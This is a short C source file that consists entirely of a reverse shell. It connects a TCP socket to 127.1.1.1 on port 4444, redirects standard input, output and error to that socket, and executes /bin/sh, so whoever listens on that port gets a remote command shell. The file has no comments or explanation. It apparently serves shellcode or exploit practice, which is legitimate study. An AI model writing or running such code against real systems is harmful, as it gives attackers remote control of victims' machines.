#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>

int main() {
	
	int sock = socket(AF_INET, SOCK_STREAM, 0);

	struct sockaddr_in addr;
	addr.sin_family = AF_INET;
	addr.sin_port = htons(4444);
	addr.sin_addr.s_addr = inet_addr("127.1.1.1");

	connect(sock, (struct sockaddr *)&addr, sizeof(addr));

	dup2(sock, 0);
	dup2(sock, 1);
	dup2(sock, 2);

	execve("/bin/sh", NULL, NULL);
}
